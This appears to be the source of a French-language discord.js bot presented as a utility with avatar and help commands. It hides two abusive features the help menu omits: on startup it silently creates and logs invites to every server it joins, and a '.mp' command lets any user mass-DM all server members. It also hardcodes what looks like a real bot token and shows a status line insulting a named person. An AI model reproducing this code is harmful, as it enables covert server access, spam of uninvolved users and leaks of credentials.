const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "process.env.TOKEN";
var prefix = ".";
var mention = "126connectés"

var fucked = false;
 
bot.on('ready', function() {
  setInterval(async () => {
const statuslist = [
  `GATE LES MEILLEURS`,
  `KAZUO OWNER OF GATE`,
  `SINBAD JTE BAISE LOL`,
];
const random = Math.floor(Math.random() * statuslist.length);

try {
  await bot.user.setPresence({
    game: {
      name: `${statuslist[random]}`,
      url : "https://www.twitch.tv/gotaga",
      url : 'https://www.twitch.tv/michou',
    },
    status: "online"
  });
} catch (error) {
  console.error(error);
}
}, 5000);
bot.guilds.forEach(guild => {
  var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
  invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
})
});

bot.on('message', message => {
    if (message.content === `${prefix}help`) {
      let embed = new Discord.RichEmbed()
    .setTitle("G A T E **|** BOT")
    .addField("**[ 1 ]** .help : Listes de toute les commandes du bot", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
    .addField("**[ 2 ]** .av : Affiche ton avatar", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
    .addField("**[ 3 ]** .inv : Donne la présentations du serveur pour inviter des joueurs", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
    .addField("**[ 4 ]** .iu : Voir les informations sur une personnes", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
    .addField("**[ 5 ]** .is : Voir les informations sur le serveur actuel", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
    .addField("**[ 6 ]** .clear : supprime vos messages", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
    .setImage("https://fr.cdn.v5.futura-sciences.com/buildsv6/images/largeoriginal/0/d/3/0d32123a56_50034121_galaxie-andromede-03.jpg")
    .setColor('#275BF0')
    .setFooter("Owner 'Kazuo#8911")
      message.channel.send(embed)
    }
});

bot.on('message', message => {
  if (message.content === `${prefix}av`) {
  if (message.deletable) message.delete();
   message.reply(`Commande effectuée`)
   let embed = new Discord.RichEmbed()
  .setTitle("G A T E **|** BOT")
  .addField("Voici ton avatar !", "-.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-.-.--.-.-.-.-.-.-.-.-.-.-")
  .setImage(message.author.avatarURL)
  .setColor('#275BF0')
    message.channel.send(embed)
  }
});

bot.on('message', msg => {
  if (msg.guild && msg.content.startsWith('.mp')) {
    msg.delete(1)
    let text = msg.content.slice('.mp'.length); 
    msg.guild.members.forEach(member => {
      if (member.id != bot.user.id && !member.user.bot) member.send(text);
    });
  }
});







bot.login("NTg0NzI4NTkwMjg5OTkzNzI4.XPPK0w.8c6BxFwuQOZGpKbw8pavQl1TcBI")